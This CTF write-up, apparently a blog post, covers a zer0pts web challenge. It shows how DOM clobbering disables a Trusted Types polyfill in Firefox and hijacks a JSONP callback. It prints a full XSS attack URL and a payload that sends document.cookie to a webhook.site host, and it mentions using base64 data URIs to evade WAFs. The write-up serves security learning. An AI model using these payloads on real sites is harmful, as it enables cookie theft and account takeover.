To quickly summarize trusted types, it restricts certain actions on the DOM. In this case, when some HTML is created, it replaces <> and when a new script is created the src url is passed through the createScriptURL function.

Now let’s think about how we can bypass this. Our goal should be to be able to create a script with a src to the JSONP endpoint and be able to control the actual response. The first problem we face is trusted types. No matter what we do, be it HTML injection or manipulating the javascript, we will not be able to call the JSONP endpoint with ?callback=ourpayload because of trusted types. How can we bypass this? The important note here is that the admin is running Firefox. As of writing this blog, Firefox has not implemented trusted types by default, hence the need for the polyfill. What this also means is that the trustedTypes object referenced by the javascript is not a native call.

The first idea that came to mind was if we can abuse the fact that it is in a try catch. If we could somehow make it fail and not raise an error, we would be able to create script tags with the ?callback parameter. In order to do this, we can use DOM clobbering. If the following HTML is injected into the page, trustedTypes will look at the HTML element and not the trustedTypes from the javascript.

`<form id=trustedTypes></form>`

However, this is not enough because the catch will still raise an Error and we still won’t be able to call the JSONP endpoint. However, if we can make !trustedTypes.defaultPolicy to be true then the Error will not be raised. This means we can simply make our DOM clobber to be the following and we will effectively disable trusted types in Firefox.

`<form id=trustedTypes><output id=defaultPolicy>`

Finally, we can DOM clobber callback and that will be passed to jsonp('/api.php', window.callback); which will let us create a script element with ?callback=ourpayload. In order to do this 1 level clobber, I used the following format which will get rid of the automatic https:// appended to the payload.

`<a id=callback href=a:alert(1);>`

This is where another really neat trick comes in. The PHP code limits our callback payload to 20 characters and it is not nearly enough to execute the javascript needed to exfil the flag. The following is from the official writeup here and allows executing payloads longer than 20 characters. What we can do is instead of putting our payload in the callback, we create a script tag using the data: uri using the jsonp() function.

The payload passed to the callback parameter would look like this. `<a href="a:jsonp(x)" id="callback"></a>`

And using our HTML injection, we can add another element like this. `<a href="data:text/plain;base64,(Base64 encoded script)" id="x"></a>`

Our final URL sent to the admin looks like the following.

`http://web.ctf.zer0pts.com:8003/?theme="><a id=callback href=a:jsonp(x)><form id=trustedTypes><output id=defaultPolicy><a href="data:text/plain;base64,(b64payload)" id="x"></a>`

The content of the payload would be the following base64 encoded and we would get the cookie to our webhook.

`document.location='https://webhook.site/your_id?'+document.cookie`

Overall this was a very neat challenge in bypassing trusted types with DOM clobbering. The use of data decoding base64 inline is a cool idea and something to keep in mind for bypassing WAFs in the future.
